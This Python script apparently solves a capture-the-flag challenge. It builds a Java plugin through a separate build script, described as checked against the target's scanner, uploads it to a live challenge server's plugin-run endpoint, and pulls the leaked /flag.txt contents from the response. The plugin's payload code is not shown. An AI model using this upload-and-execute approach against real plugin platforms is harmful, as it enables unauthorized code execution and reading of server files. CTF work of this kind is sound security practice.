#!/usr/bin/env python3
"""Build and check a B2Bee plugin, then upload it to read /flag.txt."""

from __future__ import annotations

import argparse
import os
import subprocess
import sys
from pathlib import Path

import requests

ROOT = Path(__file__).resolve().parent
EXPLOIT_DIR = ROOT / "exploit"
BUILT_JAR = EXPLOIT_DIR / "build" / "dist" / "seasonal-discount-plugin.jar"
JDK_FALLBACK_BIN = Path("/opt/homebrew/opt/openjdk@21/bin")

DEFAULT_BASE = "https://marketplugins-4qop8u5n.avitoctf.ru"
ENTRY_CLASS = "example.SeasonalDiscountPlugin"
# Any non-empty cart works; the front end refuses to run a plugin on an empty one.
TEST_CART = '{"title":"t","items":[{"title":"x","category":"y","price":100,"quantity":1}]}'
FLAG_MARKER = "avito{"
HTTP_OK = 200


def emit(message: str) -> None:
    """Write a single line to stdout (CLI output without ``print``)."""
    sys.stdout.write(message + "\n")


def build_subprocess_env() -> dict[str, str]:
    """Return an environment with a JDK 21 toolchain reachable on ``PATH``."""
    env = os.environ.copy()
    java_home_bin = Path(env.get("JAVA_HOME", "")) / "bin" if env.get("JAVA_HOME") else None
    if java_home_bin and (java_home_bin / "javac").is_file():
        env["PATH"] = f"{java_home_bin}{os.pathsep}{env.get('PATH', '')}"
    elif JDK_FALLBACK_BIN.is_dir():
        env["PATH"] = f"{JDK_FALLBACK_BIN}{os.pathsep}{env.get('PATH', '')}"
    return env


def build_plugin() -> Path:
    """Compile+package the plugin and verify it against the real scanner (``exploit/build.sh``)."""
    script = EXPLOIT_DIR / "build.sh"
    emit(f"[build] running {script}")
    subprocess.run(["bash", str(script)], cwd=EXPLOIT_DIR, env=build_subprocess_env(), check=True)
    if not BUILT_JAR.exists():
        raise FileNotFoundError(f"build.sh did not produce {BUILT_JAR}")
    return BUILT_JAR


def scan_for_flag(text: str) -> str | None:
    """Return the ``avito{...}`` substring of *text*, or ``None`` if absent."""
    start = text.find(FLAG_MARKER)
    if start < 0:
        return None
    end = text.find("}", start)
    return text[start : end + 1] if end > 0 else None


def upload_and_run(jar: Path, base: str) -> str | None:
    """Upload the plugin JAR to the live host and return the flag from ``result.message``."""
    with jar.open("rb") as jar_file:
        resp = requests.post(
            f"{base}/api/plugins/run",
            files={"plugin": (jar.name, jar_file, "application/java-archive")},
            data={"entryClass": ENTRY_CLASS, "cart": TEST_CART},
            timeout=60,
        )
    emit(f"[upload] HTTP {resp.status_code}")
    emit(resp.text[:2000])
    if resp.status_code != HTTP_OK:
        return None
    return scan_for_flag(resp.text)


def main() -> None:
    """Build+locally-verify the plugin, upload it, and print the leaked flag."""
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument(
        "base_url",
        nargs="?",
        default=DEFAULT_BASE,
        help=f"challenge base URL (default: {DEFAULT_BASE})",
    )
    args = parser.parse_args()
    base = args.base_url.rstrip("/")

    jar = build_plugin()
    emit(f"[build] plugin jar ready: {jar}")

    flag = upload_and_run(jar, base)
    if flag:
        emit(f"FLAG: {flag}")
    else:
        sys.exit("upload failed or flag not found in response — see log above")


if __name__ == "__main__":
    main()
